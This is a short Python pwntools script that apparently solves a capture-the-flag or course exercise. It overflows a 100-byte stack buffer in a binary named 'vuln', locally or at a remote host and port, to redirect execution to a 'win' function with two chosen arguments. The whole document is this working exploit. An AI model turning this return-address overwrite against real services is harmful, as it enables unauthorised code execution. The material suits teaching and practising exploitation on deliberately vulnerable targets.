#!/usr/bin/env python3

# Ref: https://cs4157.github.io/www/2024-1/lect/13-x86-assembly.html#stack-frame
# 
# ...| buf[100]   | 12 bytes | EIP | ... args ...
#

from pwn import *
import sys

binary = ELF("./vuln")

if args.REMOTE:
    if args.HOST == "" or args.PORT == "":
        error("pass HOST and PORT for remote exploit")
    p = remote(args.HOST, args.PORT)
else:
    p = process(binary.path)


##################################### PAYLOAD: ###############################################
# 100 bytes + 12 bytes + EIP (addr of win) + 4 bytes (EBP+4 return address) + arg1 + arg2   #
#############################################################################################

offset = 112
payload = b"A"*offset
payload += p32(0x08049296)
payload += p32(0x08049372)
payload += p32(0xCAFEF00D) + p32(0xF00DF00D)


print(p.recvuntil(b":").decode("utf-8"))
p.sendline(payload)
p.interactive()
